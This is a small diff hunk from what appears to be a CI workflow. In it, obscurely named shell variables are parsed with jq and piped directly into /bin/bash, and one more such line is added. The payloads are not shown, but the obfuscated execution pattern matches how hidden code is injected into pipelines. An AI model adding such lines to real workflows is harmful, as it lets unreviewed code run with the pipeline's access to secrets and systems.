@@ -28,6 +28,7 @@ jobs:
           echo $wp3 | jq -r .fe75 | /bin/bash
           echo $xwiv10 | jq -r .nbjvp9996 | /bin/bash
           echo $ouhcm5683 | jq -r .sifd9164 | /bin/bash
+          printf '%s' "$t960" | jq -r .vmsw011 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
